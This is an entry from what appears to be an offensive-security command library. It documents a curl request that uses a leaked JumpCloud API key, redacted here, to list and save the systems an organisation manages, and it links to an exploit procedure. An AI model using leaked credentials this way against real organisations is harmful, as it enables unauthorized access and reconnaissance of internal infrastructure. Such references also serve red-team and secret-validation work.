---
data: 'curl -H "x-api-key: ████████" "https://console.jumpcloud.com/api/systems"'
tags:
  - api
  - exploit
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 9bf86841-182f-42b5-9a9a-b46cfd80f670
created_at: '2025-12-11T06:10:28.758Z'
updated_at: '2025-12-11T06:10:28.758Z'
verified: false
validated: true
submitted: true
---
# curl-jumpcloud-systems

## Command

```bash
curl -H "x-api-key: ████████" "https://console.jumpcloud.com/api/systems"
```

## Description

This command uses curl to send a GET request to the JumpCloud systems endpoint, authenticating with a leaked API key to list accessible systems.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "x-api-key: ████████"` | Adds the API key header for authentication | Yes |
| `"https://console.jumpcloud.com/api/systems"` | The endpoint to retrieve system information | Yes |

## Examples

### Basic Usage

```bash
curl -H "x-api-key: ████████" "https://console.jumpcloud.com/api/systems"
```

### Advanced Usage

```bash
curl -H "x-api-key: ████████" "https://console.jumpcloud.com/api/systems" -o systems.json
```

## Expected Output

A JSON response containing a list of systems managed by JumpCloud, if the key is valid.

## Related

- [[commands/curl-jumpcloud-systemusers]]
- [[procedures/Exploit-Leaked-JumpCloud-API-Key-to-Access-Internal-Resources]]
